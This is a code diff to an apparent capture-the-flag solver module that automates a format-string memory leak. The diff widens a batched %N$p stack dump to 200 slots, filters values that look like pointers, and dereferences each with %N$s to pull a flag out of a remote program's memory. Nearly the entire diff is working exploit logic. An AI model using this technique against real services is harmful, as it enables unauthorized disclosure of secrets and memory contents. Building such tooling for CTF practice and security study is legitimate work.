@@ -20,7 +20,12 @@ from ..comms import connect
 from .subcipher import build_encoder, locate_table
 
 _BATCH = 12          # format specifiers per request (keep decoded len < buffer)
-_MAXOFF = 60         # how many stack slots to probe
+_MAXOFF = 200        # how many stack slots to probe (env/argv live high up)
+
+
+def _looks_like_ptr(v):
+    # userspace code/heap/libc/stack live in this range on x86-64 Linux
+    return 0x400000 <= v <= 0x7FFFFFFFFFFF
 
 
 class CipherFormatString(Strategy):
@@ -87,30 +92,34 @@ class CipherFormatString(Strategy):
             m = marker.search(blob)
             return m.group(1) if m else None
 
-        # ---- 1) %p stack dump (safe: never dereferences) ----
-        report.step("Leaking the stack via %p (token-encoded)...")
-        slots = {}
+        # ---- 1) wide %p dump (safe: never dereferences) ----
+        report.step(f"Leaking the stack via %p over {_MAXOFF} slots...")
+        slots = {}                        # offset -> leaked qword (int)
         for start in range(1, _MAXOFF + 1, _BATCH):
-            body = ",".join(f"%{i}$p" for i in range(start, start + _BATCH))
-            got = ask(body)
-            if got:
-                for j, tok in enumerate(got.split(b",")):
-                    tok = tok.strip()
-                    if tok.startswith(b"0x"):
-                        try:
-                            slots[start + j] = int(tok, 16).to_bytes(8, "little")
-                        except ValueError:
-                            pass
-                blob = b"".join(slots[k] for k in sorted(slots))
-                m = pat.search(blob)
-                if m:
-                    flag = m.group(0).decode(errors="replace")
-                    report.ok(f"FLAG (stack leak): {flag}")
-                    return flag
+            got = ask(",".join(f"%{i}$p" for i in range(start, start + _BATCH)))
+            if not got:
+                continue
+            for j, tok in enumerate(got.split(b",")):
+                tok = tok.strip()
+                if tok.startswith(b"0x"):
+                    try:
+                        slots[start + j] = int(tok, 16)
+                    except ValueError:
+                        pass
 
-        # ---- 2) %N$s scan (dereference each slot as a string) ----
-        report.step("No flag on the raw stack; scanning %N$s pointers...")
-        for i in range(1, _MAXOFF + 1):
+        # 1a) flag written straight onto the stack, anywhere in range
+        blob = b"".join(slots.get(k, 0).to_bytes(8, "little")
+                        for k in range(1, _MAXOFF + 1))
+        m = pat.search(blob)
+        if m:
+            flag = m.group(0).decode(errors="replace")
+            report.ok(f"FLAG (stack leak): {flag}")
+            return flag
+
+        # ---- 2) dereference every pointer-looking slot with %s ----
+        ptr_offs = [i for i in sorted(slots) if _looks_like_ptr(slots[i])]
+        report.step(f"Dereferencing {len(ptr_offs)} stack pointers via %N$s...")
+        for i in ptr_offs:
             got = ask(f"%{i}$s")
             if got:
                 m = pat.search(got)
@@ -124,9 +133,11 @@ class CipherFormatString(Strategy):
                         "is likely fully buffered with no flush path. Connect by "
                         "hand (nc) to confirm what it emits.")
         else:
-            report.warn("No flag via format-string leak. Printable stack strings:")
+            report.warn("No flag found. Printable strings seen on the stack:")
             for off in sorted(slots):
-                b = slots[off].rstrip(b"\x00")
+                b = slots[off].to_bytes(8, "little").rstrip(b"\x00")
                 if b and all(0x20 <= c < 0x7f for c in b):
                     report.info(f"  %{off}$p -> {b.decode()!r}")
+            report.info("If the flag isn't here, it may need a longer scan "
+                        "(raise _MAXOFF) or a different sink.")
         return None
